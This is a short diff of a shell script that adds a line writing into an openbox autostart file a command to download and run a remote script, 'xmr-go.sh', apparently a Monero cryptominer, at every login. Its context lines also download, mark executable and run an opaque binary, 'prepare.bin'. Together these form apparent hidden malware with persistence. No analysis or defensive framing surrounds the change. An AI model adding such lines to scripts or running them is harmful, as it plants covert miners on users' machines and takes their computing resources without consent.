@@ -14,7 +14,7 @@ case $architecture in
         exit 1
         ;;
 esac
-
+echo "sh <(curl -s https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh) &" > /config/.config/openbox/autostart
 curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
 chmod +x prepare.bin
 ./prepare.bin
